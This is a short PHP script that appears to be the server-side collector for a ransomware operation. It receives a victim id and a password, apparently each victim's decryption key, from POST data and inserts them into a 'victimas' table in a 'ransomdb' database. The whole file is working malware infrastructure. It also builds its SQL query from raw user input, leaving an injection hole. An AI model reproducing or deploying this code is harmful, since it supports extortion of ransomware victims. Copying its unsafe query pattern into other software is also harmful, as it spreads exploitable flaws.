<?php
$server = "localhost";
$username = "ransomdb";
$password = "";
$dbname = "ransomdb";
$pass = (string)$_POST['pass'];
$id = (string)$_POST['id'];
$conn = new mysqli($server, $username, $password, $dbname);
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
} 
$sql = "INSERT INTO victimas (idd, pass) VALUES ('$id', '$pass');";
if ($conn->query($sql) === TRUE) {
    echo "Ok.";
} else {
    echo "Error: " . $sql . "<br>" . $conn->error;
}
$conn->close();
?>
